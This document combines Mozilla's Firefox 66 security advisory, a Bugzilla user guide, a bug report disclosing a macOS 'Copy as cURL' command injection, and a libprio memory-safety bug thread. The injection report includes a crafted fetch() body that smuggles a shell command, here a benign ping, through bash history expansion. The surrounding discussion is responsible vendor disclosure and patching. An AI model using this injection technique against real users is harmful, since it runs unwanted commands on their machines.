Products
Firefox
Fixed in

* Firefox 66

#### [#CVE-2019-9790: Use-after-free when removing in-use DOM elements](#CVE-2019-9790)

Reporter
Brandon Wieser
Impact
critical
##### Description

A use-after-free vulnerability can occur when a raw pointer to a DOM element on a page is obtained using JavaScript and the element is then removed while still in use. This results in a potentially exploitable crash.

##### References

* [Bug 1525145](https://bugzilla.mozilla.org/show_bug.cgi?id=1525145)

#### [#CVE-2019-9791: Type inference is incorrect for constructors entered through on-stack replacement with IonMonkey](#CVE-2019-9791)

Reporter
Samuel Groß of Google Project Zero
Impact
critical
##### Description

The type inference system allows the compilation of functions that can cause type confusions between arbitrary objects when compiled through the IonMonkey just-in-time (JIT) compiler and when the constructor function is entered through on-stack replacement (OSR). This allows for possible arbitrary reading and writing of objects during an exploitable crash.

##### References

* [Bug 1530958](https://bugzilla.mozilla.org/show_bug.cgi?id=1530958)

#### [#CVE-2019-9792: IonMonkey leaks JS\_OPTIMIZED\_OUT magic value to script](#CVE-2019-9792)

Reporter
Samuel Groß of Google Project Zero
Impact
critical
##### Description

The IonMonkey just-in-time (JIT) compiler can leak an internal `JS_OPTIMIZED_OUT` magic value to the running script during a bailout. This magic value can then be used by JavaScript to achieve memory corruption, which results in a potentially exploitable crash.

##### References

* [Bug 1532599](https://bugzilla.mozilla.org/show_bug.cgi?id=1532599)

#### [#CVE-2019-9793: Improper bounds checks when Spectre mitigations are disabled](#CVE-2019-9793)

Reporter
Bruno Keith & Niklas Baumstark from the phoenhex team
Impact
high
##### Description

A mechanism was discovered that removes some bounds checking for string, array, or typed array accesses if Spectre mitigations have been disabled. This vulnerability could allow an attacker to create an arbitrary value in compiled JavaScript, for which the range analysis will infer a fully controlled, incorrect range in circumstances where users have explicitly disabled Spectre mitigations.
 *Note: Spectre mitigations are currently enabled for all users by default settings.*

##### References

* [Bug 1528829](https://bugzilla.mozilla.org/show_bug.cgi?id=1528829)

#### [#CVE-2019-9794: Command line arguments not discarded during execution](#CVE-2019-9794)

Reporter
Joshua Graham
Impact
high
##### Description

A vulnerability was discovered where specific command line arguments are not properly discarded during Firefox invocation as a shell handler for URLs. This could be used to retrieve and execute files whose location is supplied through these command line arguments if Firefox is configured as the default URI handler for a given URI scheme in third party applications and these applications insufficiently sanitize URL data.
 *Note: This issue only affects Windows operating systems. Other operating systems are unaffected.*

##### References

* [Bug 1530103](https://bugzilla.mozilla.org/show_bug.cgi?id=1530103)

#### [#CVE-2019-9795: Type-confusion in IonMonkey JIT compiler](#CVE-2019-9795)

Reporter
Nils
Impact
high
##### Description

A vulnerability where type-confusion in the IonMonkey just-in-time (JIT) compiler could potentially be used by malicious JavaScript to trigger a potentially exploitable crash.

##### References

* [Bug 1514682](https://bugzilla.mozilla.org/show_bug.cgi?id=1514682)

#### [#CVE-2019-9796: Use-after-free with SMIL animation controller](#CVE-2019-9796)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability can occur when the SMIL animation controller incorrectly registers with the refresh driver twice when only a single registration is expected. When a registration is later freed with the removal of the animation controller element, the refresh driver incorrectly leaves a dangling pointer to the driver's observer array.

##### References

* [Bug 1531277](https://bugzilla.mozilla.org/show_bug.cgi?id=1531277)

#### [#CVE-2019-9797: Cross-origin theft of images with createImageBitmap](#CVE-2019-9797)

Reporter
AaylaSecura1138
Impact
high
##### Description

Cross-origin images can be read in violation of the same-origin policy by exporting an image after using `createImageBitmap` to read the image and then rendering the resulting bitmap image within a `canvas` element.

##### References

* [Bug 1528909](https://bugzilla.mozilla.org/show_bug.cgi?id=1528909)

#### [#CVE-2019-9798: Library is loaded from world writable APITRACE\_LIB location](#CVE-2019-9798)

Reporter
Jeff Gilbert
Impact
high
##### Description

On Android systems, Firefox can load a library from `APITRACE_LIB`, which is writable by all users and applications. This could allow malicious third party applications to execute a man-in-the-middle attack if a malicious code was written to that location and loaded.
 *Note: This issue only affects Android. Other operating systems are unaffected.*

##### References

* [Bug 1527534](https://bugzilla.mozilla.org/show_bug.cgi?id=1527534)

#### [#CVE-2019-9799: Information disclosure via IPC channel messages](#CVE-2019-9799)

Reporter
Paul Theriault
Impact
high
##### Description

Insufficient bounds checking of data during inter-process communication might allow a compromised content process to be able to read memory from the parent process under certain conditions.

##### References

* [Bug 1505678](https://bugzilla.mozilla.org/show_bug.cgi?id=1505678)

#### [#CVE-2019-9801: Windows programs that are not 'URL Handlers' are exposed to web content](#CVE-2019-9801)

Reporter
Daniel Veditz
Impact
moderate
##### Description

Firefox will accept any registered Program ID as an external protocol handler and offer to launch this local application when given a matching URL on Windows operating systems. This should only happen if the program has specifically registered itself as a "URL Handler" in the Windows registry.
 *Note: This issue only affects Windows operating systems. Other operating systems are unaffected.*

##### References

* [Bug 1527717](https://bugzilla.mozilla.org/show_bug.cgi?id=1527717)

#### [#CVE-2019-9802: Chrome process information leak](#CVE-2019-9802)

Reporter
Stephen Fewer
Impact
moderate
##### Description

If a Sandbox content process is compromised, it can initiate an FTP download which will then use a child process to render the downloaded data. The downloaded data can then be passed to the Chrome process with an arbitrary file length supplied by an attacker, bypassing sandbox protections and allow for a potential memory read of adjacent data from the privileged Chrome process, which may include sensitive data.

##### References

* [Bug 1415508](https://bugzilla.mozilla.org/show_bug.cgi?id=1415508)

#### [#CVE-2019-9803: Upgrade-Insecure-Requests incorrectly enforced for same-origin navigation](#CVE-2019-9803)

Reporter
Xiaoyin Liu, Vinothkumar Nagasayanan
Impact
moderate
##### Description

The Upgrade-Insecure-Requests (UIR) specification states that if UIR is enabled through Content Security Policy (CSP), navigation to a same-origin URL must be upgraded to HTTPS. Firefox will incorrectly navigate to an HTTP URL rather than perform the security upgrade requested by the CSP in some circumstances, allowing for potential man-in-the-middle attacks on the linked resources.

##### References

* [Bug 1515863](https://bugzilla.mozilla.org/show_bug.cgi?id=1515863)

#### [#CVE-2019-9804: Code execution through 'Copy as cURL' in Firefox Developer Tools on macOS](#CVE-2019-9804)

Reporter
potatoe
Impact
moderate
##### Description

In Firefox Developer Tools it is possible that pasting the result of the 'Copy as cURL' command into a command shell on macOS will cause the execution of unintended additional bash script commands if the URL was maliciously crafted. This is the result of an issue with the native version of Bash on macOS.
 *Note: This issue only affects macOS. Other operating systems are unaffected.*

##### References

* [Bug 1518026](https://bugzilla.mozilla.org/show_bug.cgi?id=1518026)

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)

You've probably noticed that BMO has a lot going on. We'll now delve into some more details of various definitions, features, and processes in BMO.

For people working on Firefox, please see [the Bug Handling section in the in-tree documentation for information on how to triage and make decisions on bugs](https://firefox-source-docs.mozilla.org/bug-mgmt/index.html).

Finally, this is a work in progress (and may always be, since BMO is improving all the time). There are many stubs (indicated by italics).

# Creating a Bugzilla Account

To fully use all of the features of bugzilla.mozilla.org and most importantly, to file a new bug you will need to create an account. Currently there are two ways to do this.

## Create a Local Account

From the homepage, click "new account," which will let you create an account directly. You will need a valid email address. An email will be sent that will provide a special link you can follow to finish the account creation process. You will be able to enter your own private password.

## Log in With GitHub

If you have a GitHub account you can use it to log in and create an account.

* First click "Log in".
* Then click the Octocat/GitHub logo.
* If you are signed into GitHub you'll be asked if you want GitHub to login to bugzilla.mozilla.org on your behalf and what information about your account will be shared from GitHub with us.
* If you aren't signed in, GitHub will ask you to login, then if you want to be asked if you want GitHub to be able to login on your behalf.
* You'll be identified by the email address you use on GitHub.

**Note:** If you have previously created a local account as described in the first method above, and then decide to use GitHub to login later, just make sure the email address you have registered in GitHub matches the email address used to create the local account. Otherwise, a separate account will be created which is likely not what you want.

# Searching

*Omg, so many ways to search; why do we have so many, and how do they work?*

## Quick Search

*Quick Search rocks! You should use it.*

## Advanced Search, Pronouns

*Advanced search looks hardcore, but the rewards for learning how to drive it are plentiful. Also, pronouns are amazing.*

## Other Searches (Instant, Simple, Google)

*In case you were looking for more ways to search.*

# Bugmail

*Bugmail* is the common term for automated emails from BMO. The biggest source of bugmail is changes to bugs, but BMO may also email you reports and other notices.

## Filtering

*Too much bugmail? Filter on BMO itself and/or via x-headers!*

### Filtering with GMail

GMail's ability to filter on headers is somewhat limited. We've got a separate, complete [guide](/BMO/UserGuide/Filtering_Bugzilla_Email_in_GMail "BMO/UserGuide/Filtering Bugzilla Email in GMail") on advanced bugmail filtering with GMail.

# Users

Bugzilla isn't as user-centric as many modern web apps, but we've added a few features in the last few years.

## User Profiles

By selecting [My Profile](https://bugzilla.mozilla.org/user_profile) from the dropdown in BMO's header, you can see a collection of statistics about your interactions with BMO. You can use the Search field at the top to see the profile of any other BMO user. Clicking on a user's name in a bug view also provides a link to that user's profile.

There's a [project page](/BMO/UserProfiles "BMO/UserProfiles") about User Profiles which has brief description of the fields.

## "New to Bugzilla"

A user's comments will be tagged as "New to Bugzilla" under the following conditions:

# Understanding, Editing, and Filing Bugs

## Standard Bug Fields

Bugzilla bugs have a lot of fields that allow for classifying types of bugs. This also allows for easy grouping and searching for specific bugs. Most of the standard bug fields are described [here](/BMO/UserGuide/BugFields "BMO/UserGuide/BugFields").

## Comment Tagging

Want to convey some out-of-band information on a comment? Tag it.
Want to auto-collapse a spammy, abusive, or obsolete comment? [Tag it](/BMO/Comment_Tagging "BMO/Comment Tagging").

## Comment Editing

Some users can edit comments made on bugs, if you do so, please follow [our guidelines](/BMO/Editing_Comments "BMO/Editing Comments").

## Keywords and the Whiteboard

*What are all these keywords and weird whiteboard stuff? What is a whiteboard anyhow? Which should i use?*

**Keywords**:
These are a limited set of keyword tags, set by teams and people with admin privilege. You can start typing a tag and get a dropdown menu of all the keywords currently available. Keywords like "regression" and "crash" are used by engineering, release, and QA teams, for example.

**Whiteboard**:
The whiteboard field is for free tagging. It's used both by teams and by people who want to track bugs they're interested in.

## Tracking Status

See [BMO/UserGuide/BugStatuses](/BMO/UserGuide/BugStatuses "BMO/UserGuide/BugStatuses")

## Tracking Flags

[![Flagexample.png](/images/thumb/8/89/Flagexample.png/400px-Flagexample.png)](/File%3AFlagexample.png)
### tracking-firefoxXX

*Who's doing the tracking? Should i even set these flags?*

Tracking flags are used by developers, triagers, QA and the release management teams to keep track of bugs whose fixes are slated to go into a particular product release. A tracking flag shows whether a bug is being investigated for possible resolution in the Firefox XX release. Bugs marked tracking-Firefox XX are bugs that must be resolved one way or another before a particular release ships. [Release drivers](/Firefox/Drivers "Firefox/Drivers") will track and shepherd the bug until it is determined the bug no longer impacts the release.

[![Tracking-flag-example.png](/images/thumb/4/4b/Tracking-flag-example.png/300px-Tracking-flag-example.png)](/File%3ATracking-flag-example.png)

Tracking flags have the values:

| Value | Meaning |
| --- | --- |
| --- | Default/Not nominated |
| ? | Bug is nominated for this release |
| + | Bug is tracked for this release |
| - | Bug will not be tracked for this release |
| blocking | Bug is considered a blocker for this release |

Most users will only be able to [nominate a bug for tracking](/Release_Management/Release_Process#All_about_Flags "Release Management/Release Process") by setting the tracking flag for a release to *?*. The Release Drivers group (which includes Release Management) will respond to the request for tracking.

For example, a [search for tracking Firefox Beta and "+"](https://bugzilla.mozilla.org/buglist.cgi?f1=cf_tracking_firefox_beta&o1=equals&v1=%2B) would list the bugs which release managers decided to track for the Beta release of Firefox.

If you would like to suggest a bug and its fix be considered (by release managers) for a particular release, edit the bug and set the tracking flag for that release to *?*. This is often done for a bug that's been fixed in one release channel but needs to be uplifted to another.

Refer to [these guidelines](http://web.archive.org/web/20160417051846/https%3A//blog.mozilla.org/channels/2011/06/01/more-details-about-how-to-use-the-tracking-firefox-bugzilla-flag/) on setting the tracking flag.

### status-firefoxXX

A flag which represents the status of the bug with respect to Firefox XX.

status-firefoxXX

| --- | We don't know whether Firefox XX is affected |
| --- | --- |
| ? | We don't know whether Firefox XX is affected, but we want to find out |
| unaffected | This bug does not affect Firefox XX |
| affected | This bug affects Firefox XX |
| fix-optional | This bug affects Firefox XX, we would take a fix but don't consider it as release blocking |
| fixed | This bug is fixed in Firefox XX |
| verified | This bug is fixed and verified in Firefox XX |
| disabled | This feature is disabled in Firefox XX |
| verified disabled | Disabling the feature is verified in Firefox XX |
| wontfix | A fix for this bug will not be accepted in Firefox XX |

**Approval Flags**: Set on the attachment of a bug
All patches landing on *mozilla-beta/release/esr* branches must have these nominated by setting a ***?***  flag.
Please make sure to fill in the populated list of questions **[Approval Request Comment]** that come up on the attachment.
This helps Release Management understand the user impact & the risk/reward analysis before we grant or deny approval. If this form is left incomplete it will be sent back to you for completion.

[![ApprovalRequest.png](/images/thumb/e/e7/ApprovalRequest.png/750px-ApprovalRequest.png)](/File%3AApprovalRequest.png)
## Status Flags

Status flags detail, at the release level, if a bug is present or will be addressed in a particular version.

[![Thumb](/images/6/62/Status-flag-example.png)](/File%3AStatus-flag-example.png "Thumb")

## Project Flags

Project flags are used to supplement a bug's prioritization. These flags are defined at the product and component level and will not be present for all bugs. Most often they are used to establish when a bug is to be worked on during a multi-release spanning project.

Example project flags are:

* [a11y-review](https://firefox-source-docs.mozilla.org/bug-mgmt/processes/accessibility-review.html)
* [Webcompat Priority](https://wiki.mozilla.org/Compatibility/WebCompat_Priority_Flags)
* [Performance Impact](https://wiki.mozilla.org/Performance/Bugzilla#Project_Flag)

## Needinfo Flag

In some bug tracking systems, to request information from someone about a bug, the bug is usually assigned to the person asked. In Bugzilla, we use *needinfo* flags.

The *needinfo* flag can be set at or after a bug's creation. When a *needinfo* flag is set, the person asked receives an email directing them to visit the bug, logging in if necessary, and answer the question.

To create a *needinfo*, you can specify the bug's assignee (if any,) the bug's triage owner (if one is defined,) the bug's reporter, or another user. Ask the question in a comment and set the *needinfo* flag before you save the bug.

Common uses of *needinfo* include:

* Asking a bug reporter for more information so that a bug can be triaged
* Asking a subject matter expert for direction or clarification

Please respond to *needinfo* requests quickly to keep others from being blocked.

To clear a needinfo, go to the bug's page, respond to the question and save your comment. By default the *clear this needinfo request* checkbox is ticked.

If you need to route the request to another person, leave the *clear this needinfo request* checkbox ticked, and set a new *needinfo* for the person to which you want to send the question to, then save the bug.

You can see the *needinfo* flags you have requested of others and the ones requested of you in [My Dashboard](https://bugzilla.mozilla.org/page.cgi?id=mydashboard.html).

# Team to components mapping

All Bugzilla components are linked to a team.

The full list of teams is available at <https://bugzilla.mozilla.org/rest/config/component_teams>.

The full list of components linked to a specific team is available at <https://bugzilla.mozilla.org/rest/config/component_teams/TEAM_NAME> (replace TEAM\_NAME with an actual team name).

Use <https://bugzilla.mozilla.org/rest/product?type=accessible&include_fields=name&include_fields=components.name&include_fields=components.team_name> if you want to find out what team is assigned to a specific component.

When creating a new component, make sure to link it to the right team. If you are not sure, use the team the triage owner of the new component belongs to.

## Adding a new team or changing an existing one

File a bug at <https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration> asking to change component info.

Make sure :marco is CCed so they can adjust the quality weekly reports. Needinfo :dveditz to adjust the weekly security report

# Other Ways to use BMO and its Data

## Whining

*Bugzilla can automatically send you buglists (requires canconfirm).*

BMO can automatically send you buglists (or a group of people) at defined intervals. This requires that you have specific rights required to [create whines](https://bugzilla.mozilla.org/editwhines.cgi).

## APIs

*I hear you want to integrate with BMO. Where to start, what to do next, and best practices which won't get you blocked.*

BMO has a REST API that can perform most common tasks and is great for allowing external systems to integrate with Bugzilla. More details on how to use the API can be found [here](http://bmo.readthedocs.io/en/latest/api/index.html).

## Dashboards

*Trying to answer the "what should i do today" question? Go no further than the dashboards.*

[My Dashboard](https://bugzilla.mozilla.org/page.cgi?id=mydashboard.html) has some nice options for viewing lists of bugs that may be of interest to you.

# Permissions and Groups

If you would like to be able to change the status of bugs from UNCONFIRMED to NEW, you will need the canconfirm permission. It also allows you to file a bug as NEW rather than as UNCONFIRMED, which is the default for bugs filed by new users to bugzilla.mozilla.org.

The editbugs permission gives you the ability to edit most fields of a bug. It's very useful for adding good information to a bug, and for making summaries more clear and descriptive.

## How to apply for upgraded permissions

If you want **canconfirm**, you can add it yourself using [triage request form](https://bugzilla.mozilla.org/page.cgi?id=triage_request.html).

If you want **editbugs**, [file a new bug, including](https://mzl.la/2izLT4J):

* The URLs of two bugs to which you have attached patches or testcases.
* The URLs of the relevant comment on three bugs which you wanted to change, but couldn't, and so added a comment instead.

**Note:** **editbugs** implies **canconfirm** there's no need to apply for both.

There are many other groups, some team-specific, some for security reasons, and some that are for corporate confidential bugs or comments. By default, everyone is in the BMO group **everyone**. Your permissions affect which shared searches you can see. When you create a saved search of your own, you can choose to share it with any group that are in.

You can see your current [groups and permissions](https://bugzilla.mozilla.org/userprefs.cgi?tab=permissions).

# BMO vs Bugzilla

Bugzilla is the name of the popular issue-tracking software application, used by many organizations and maintained by the Bugzilla project. Its home is at <http://www.bugzilla.org>. While the Bugzilla project was started by Mozilla, it is administered separately, having its own Project Lead, Assistant Project Leads, and other roles. Most of the roles are, at current, occupied by Mozilla contributors, but in the past core Bugzilla contributors have not had significant involvement in other Mozilla projects. Mozilla does provide resources, including employee time, to the Bugzilla project. The best description of Mozilla's involvement in Bugzilla is that of a steward.

BMO is an abbreviation of bugzilla.mozilla.org. It is Mozilla's site-specific Bugzilla installation, which is a slight fork of the standard Bugzilla source (or "upstream") with many extensions. At the moment, the fork is technically from Bugzilla 4.2, but many features have been backported from 4.4 and master—in fact, many features in those branches were written by the BMO developers, who added them to upstream but also backported them so they could be immediately available to BMO users. Since we've backported most fixes and features that are of particular use in BMO, we haven't been strict about keeping up with the latest official upstream release. Another difference is that the BMO devs have not prioritized deployability in BMO, since fixes and features are just pushed out each week to the BMO installation, although they have made significant progress in making BMO [more hackable](/BMO/Hacking "BMO/Hacking").

In sum, the main difference between Bugzilla and BMO is that the former is the name of the general-purpose software, and the latter Mozilla's site-specific installation. An analogue is [MediaWiki](https://www.mediawiki.org/wiki/MediaWiki) versus [Wikipedia](https://en.wikipedia.org/wiki/Main_Page).

VULNERABILITY DETAILS
Copypasting of curl requests from Firefox can produce RCE in MacOS.
For example we have such JS code:
fetch('<https://google.com>', {'body':'\'!ls:q:gs|ls|;ping 8.8.8.8;|', method:'POST'})
If we will copy it as curl we will get such bash command:
curl '<https://google.com/>' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko/20100101 Firefox/64.0' -H 'Accept: \*/\*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'content-type: text/plain;charset=UTF-8' -H 'origin: null' -H 'DNT: 1' -H 'Connection: keep-alive' --data $'\'!ls:q:gs|ls|;ping 8.8.8.8;|'
The interesting part is here:
$'\'!ls:q:gs|ls|;ping 8.8.8.8;|'
It is calling following command:
ping 8.8.8.8
But how?
The problem that mac uses old bash, and there is lack of some updates. And current mac version of bash has a problem with bash history expansions.
Our bash command will be actually interpreted interesting if some of our previous commands contained 'ls'. So we will have such request:
curl '<https://google.com/>' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko/20100101 Firefox/64.0' -H 'Accept: \*/\*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'content-type: text/plain;charset=UTF-8' -H 'origin: null' -H 'DNT: 1' -H 'Connection: keep-alive' --data $'\'';ping 8.8.8.8;''
Interesting part is here:
$'\'';ping 8.8.8.8;''
So you see that here our string transformed into executable bash code.
WHATS HAPPEN
First of all when I found this, I asked to fix it bash team, but they told me that it is not a vulnerability at all, so there is no CVE, and that it is fixed in newer bash (it is true), and they won't fix it for old versions.
Okay, I sent this information to Apple, and they fixed it... But I was slow and didn't check there fix. But later I checked fix. And the fix was strange... They fixed Safari inspector. So it looks like Apple actually doesn't think that it is a problem in Bash as I inderstand.
So I am sending report to Firefox team.
VERSION
Works only in MacOS in any version of Firefox.
REPRODUCTION CASE

Thanks for this report.
Does this also work in Chrome's devtools, and did you report to them (if so, can you provide the URL)? Do you know if there is a (public or private) URL for the safari/mac "fix"?

"Does this also work in Chrome's devtools, and did you report to them"
Yes it works, but I made report yesterday for both: Firefox and Chrome. So it is not public yet.
"Do you know if there is a (public or private) URL for the safari/mac "fix"?"
For Safari:

OK, can you provide the link for completeness? We may be able to coordinate with Chrome, though if the fix for Safari is already public it might not matter very much anymore...

I'm assuming this was the fix in Web Inspector: <https://github.com/WebKit/webkit/commit/5736bda9ad07609ef386e2d5a7f5308c17b98586>.

I can't find any reference to a commit from <https://support.apple.com/en-us/HT208324>, or a commit with the the CVE ID.

I don't feed strongly about it. It's a simple fix that release-drivers would probably take, but how many people are doing web development on ESR, let alone on ESR on mac?

That's a good point. Given that this is DevTools + OSX only, I'm leaning towards not taking the resources required to get this uplifted and tested onto 60.

The same potential issue exists in both serial\_read\_mp\_array and read\_packet\_client:

SECStatus rv = SECSuccess;

P\_CHECKCB(upk != NULL); // NOTE: potential problem

... possibly more P\_CHECKCB conditions

msgpack\_unpacked res;

The P\_CHECKCB macro goes to cleanup, which does this:

cleanup:

msgpack\_unpacked\_destroy(&res);

The msgpack\_unpacked\_destroy function does this with the uninitialized memory:

static inline void msgpack\_unpacked\_destroy(msgpack\_unpacked\* result)

{

if(result->zone != NULL) {

msgpack\_zone\_free(result->zone);

result->zone = NULL;

memset(&result->data, 0, sizeof(msgpack\_object));

}

}

Yup, looks like a bug to me! I used the same faulty design pattern in a bunch of places in serial.c, so we should fix them all in one go.

An attacker would only be able to trigger this behavior if one of these buggy assertions (e.g., `P_CHECKCB(upk != NULL);`) fails, which shouldn't happen unless there is also a bug in the code that calls these functions.

In any event, we should fix this. Rob, do you want me to open a PR for this against the mozilla/libprio repo?

We should take this opportunity to figure out a good workflow for handling security bugs in libprio. Even though Prio is not enabled by default, we may start enabling it for some users so we should treat these like we would any security issue in Firefox.

I'm thinking we should have a private fork of libprio that we uplift from, then we can land patches in the public libprio repo when Mozilla is ready to announce security bugs. This would be a little more work since we'd need to keep both repos in sync but I don't think it'd be too bad.

I am waiting for input from our security folks to find out if we already have best practices around this, do you mind holding off opening a PR on the public repo for now?

OK so state-of-the art is to land a patch first, ship, then land in github when we've shipped. An example where this was done is libvorbis in [bug 1446062](/show_bug.cgi?id=1446062 "VERIFIED FIXED - ZDI-CAN-5822 - Mozilla Firefox Audio Driver Out of Bounds").

So I think there's no real point in bothering with a private github repo, the amount of work for the patch author is roughly the same, except for having to use two review systems :)

Henry, would you mind reviewing a patch? I think you just need to log in to phabricator with your bugzilla account to be able to do so:

Rob, after reviewing your patch, I grep'd through the libprio source to look for other places where I may have misused the msgpack API.

The only other place we use it is in `client.c` and it looks like there are indeed two similar bugs there. In particular, in `PrioClient_encode` and `PrioPacketClient_decrypt`, a failure early on in the function could cause the program to invoke `msgpack_*_destroy` on an uninitialized object.

* In `PrioClient_encode`, pulling the `msgpack_*_init` function calls up above the assertions should fix the bug.
* In `PrioPacketClient_decrypt`, line 346, we should do something like this to make sure that we don't call `msgpack_unpacker_destroy` after initialization has failed:
  ```
  if (!msgpack_unpacker_init(&upk, data_len)) {
    return SECFailure;
  }
  ...

  ```

Since we don't use the msgpack API anywhere else in libprio, I am cautiously optimistic that we will not find more instances of this particular type of bug elsewhere in the library.

Thanks for catching those! I'll amend the current patch.

[Bug 1521360](/show_bug.cgi?id=1521360 "RESOLVED FIXED - Two potential loads from uninitialized memory in Prio serial_read_mp_array and read_packet_client") - ensure that Prio early cleanup runs correctly r?henrycg

## Security Approval Request

### How easily could an exploit be constructed based on the patch?

Per [bug 1521360 comment 3](/show_bug.cgi?id=1521360#c3 "RESOLVED FIXED - Two potential loads from uninitialized memory in Prio serial_read_mp_array and read_packet_client"), this should only be exploitable if there is also a bug in the code calling these functions, which we do not believe to be the case.

### Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?

Yes

### Which older supported branches are affected by this flaw?

release (65.0)

### If not all supported branches, which bug introduced the flaw?

None

### Do you have backports for the affected branches?

Yes

### If not, how different, hard to create, and risky will they be?

### How likely is this patch to cause regressions; how much testing does it need?

This feature (Prio) has complete unit tests and is preffed off by default, it probably does not need additional manual testing in addition to the automated tests.

[Bug 1521360](/show_bug.cgi?id=1521360 "RESOLVED FIXED - Two potential loads from uninitialized memory in Prio serial_read_mp_array and read_packet_client") - ensure that Prio early cleanup runs correctly r?henrycg

## Beta/Release Uplift Approval Request

Yes

### Has the fix been verified in Nightly?

No

### Needs manual test from QE?

No

### If yes, steps to reproduce
